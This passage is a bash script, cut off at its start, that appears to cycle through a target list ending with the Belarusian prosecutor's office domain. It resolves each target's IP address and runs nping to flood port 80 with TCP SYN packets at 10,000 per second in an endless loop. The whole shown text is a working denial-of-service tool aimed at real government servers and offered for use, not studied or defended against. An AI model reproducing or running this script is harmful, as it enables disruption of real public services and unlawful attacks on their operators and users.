prokuratura.gov.by"

green="$(tput setaf 2)"
reset="$(tput sgr0)"

while true; do
  while read -r target; do
    echo "Target:${green} $target ${reset}"

    trap 'echo;exit' INT
    timeout --foreground 5 sleep 10

    # will send 10k packets per second for 10 seconds
    ip=$(dig +short ${target} | grep '^[.0-9]*$')
    sudo nping --tcp --dest-port 80 --flags syn --rate 10000 -c 100000 -v-1 ${ip}
    echo
  done <<< $(shuf <<< $targets | tail -n 10)

  sleep 1
done
